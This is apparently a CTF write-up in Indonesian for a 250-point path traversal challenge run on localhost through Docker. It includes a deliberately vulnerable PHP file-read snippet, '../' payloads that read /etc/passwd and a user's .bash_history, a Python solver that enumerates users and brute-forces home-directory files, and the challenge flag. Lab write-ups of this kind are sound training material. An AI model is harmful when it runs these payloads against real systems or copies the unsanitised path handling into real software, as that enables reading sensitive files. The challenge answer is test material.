# WriteUp: Bukankah Ini My...

## Overview

* **Judul:** Bukankah Ini My...
* **Kategori:** File Exploitation (Path Traversal)
* **Poin:** 250
* **Deskripsi:** Bisa ngga lu menyusuri jejak si karbit?
* **Author:** (Unknown/Platform Specific)
* **URL:** `http://localhost:1337`

## Informasi Attachment

File yang diberikan adalah `karbit1.yml`.

**Struktur Direktori:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/File Exploitation/Bukankah Ini My...]
└─$ tree
.
├── karbit1.yml
└── exploit.py

0 directories, 2 files

```

**Konten File (`karbit1.yml`):**

```yaml
services:
  web:
    image: ghcr.io/hengkerrusia/dirtrav1:latest
    ports:
      - "1337:3000"
    environment:
      - PWN=${PWN:-testuser}
    restart: unless-stopped

```

## Proses Penyelesaian

### 1. Menjalankan Environment

Challenge dijalankan menggunakan Docker Compose pada port **1337**.

**Output Terminal:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/File Exploitation/Bukankah Ini My...]
└─$ PWN=WanZKey docker compose -f karbit1.yml up -d --build

```

### 2. Source Code Analysis (White Box)

Melakukan inspeksi file `index.php` di dalam container. Ditemukan kerentanan **Classic Path Traversal** karena input pengguna langsung digabungkan dengan path direktori tanpa sanitasi.

**Snippet Vulnerable (`index.php`):**

```php
if (isset($_GET['file'])) {
    $uploadDir = 'videos/';
    $file = $_GET['file'];

    // VULNERABILITY: Insecure Concatenation
    // Input pengguna ($file) digabungkan mentah-mentah dengan string 'videos/'.
    // Tidak ada pengecekan '..' (dot-dot) atau validasi direktori.
    $path = $uploadDir . $file;

    if (file_exists($path)) {
        readfile($path);
    } 
    // ...
}

```

**Analisis Kerentanan:**

1. **Vulnerability:** Path Traversal (Local File Inclusion).
2. **Logic:** Aplikasi berharap user hanya mengakses file di dalam folder `videos/`.
3. **Exploit:** Karena tidak ada filter, penyerang dapat menggunakan karakter traversal `../` untuk "mundur" dari direktori `videos/` menuju root server dan mengakses file sensitif.
* Logic Server: `videos/` + `../../../../etc/passwd`
* Resolved Path: `/etc/passwd`



### 3. Enumeration & Flag Hunting

Strategi eksploitasi dilakukan dalam dua tahap:

1. **User Enumeration:** Mengakses `/etc/passwd` untuk mengetahui nama user yang ada di sistem selain root.
* Payload: `../../../../etc/passwd`
* Hasil: Ditemukan user **`denji`** (UID 1000).


2. **Flag Hunting:** Mencari file sensitif di direktori home user `denji`.
* Percobaan umum: `/home/denji/flag.txt`, `/home/denji/.bashrc`.
* Percobaan sukses: `/home/denji/.bash_history`. File ini berisi riwayat perintah terminal yang diketik user, seringkali user tidak sengaja melakukan `echo` flag atau cat flag di sini.



### 4. Exploitation

Mengirimkan payload traversal untuk membaca `/home/denji/.bash_history`.

**Payload:**
`../../../../home/denji/.bash_history`

## Script Solver

Script Python untuk melakukan enumerasi user dan pengambilan flag secara otomatis.

**File:** `exploit.py`

```python
import requests
import re

# Target URL
URL = "http://localhost:1337"

def exploit():
    print(f"[*] Target: {URL}")
    
    # Tahap 1: Cek /etc/passwd untuk mencari nama user
    print("[*] Checking /etc/passwd...")
    payload_passwd = "../../../../etc/passwd"
    
    try:
        r = requests.get(URL, params={'file': payload_passwd})
        
        users = []
        if "root:x:0:0" in r.text:
            print("[+] /etc/passwd FOUND!")
            # Parsing user biasa (biasanya punya shell /bin/bash atau /bin/sh)
            for line in r.text.splitlines():
                if "sh" in line and "root" not in line and "www-data" not in line:
                    parts = line.split(':')
                    if len(parts) > 0:
                        users.append(parts[0])
            
            print(f"[+] Detected potential users: {users}")
        else:
            print("[-] Failed to read /etc/passwd")
            return

        # Tahap 2: Brute Force File Sensitif di Home Directory User
        files_to_check = [
            ".bash_history", # Target utama kita
            ".bashrc",
            "flag.txt",
            "flag"
        ]
        
        for user in users:
            for filename in files_to_check:
                target_file = f"/home/{user}/{filename}"
                payload = f"../../../../{target_file}"
                
                print(f"[*] Trying: {target_file}...", end="\r")
                
                r = requests.get(URL, params={'file': payload})
                
                # Cek jika flag pwn{...} ada di response
                flag = re.search(r'pwn\{.*?\}', r.text)
                
                if flag:
                    print(f"\n[+] FILE FOUND: {target_file}")
                    print("-" * 40)
                    print(f"\n[!!!] JACKPOT! FLAG: {flag.group(0)}\n")
                    return

    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    exploit()

```

## Output Terminal Solver

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/File Exploitation/Bukankah Ini My...]
└─$ ./exploit.py
[*] Target: http://localhost:1337
[*] Checking /etc/passwd...
[+] /etc/passwd FOUND!
[+] Detected potential users: ['shutdown', 'sshd', 'denji']
[*] Trying: /home/denji/.bash_history......
[+] FILE FOUND: /home/denji/.bash_history
----------------------------------------

[!!!] JACKPOT! FLAG: pwn{ed29182a8fc8d40a0d997617188bed58}

```

## Flag

```
pwn{ed29182a8fc8d40a0d997617188bed58}

```
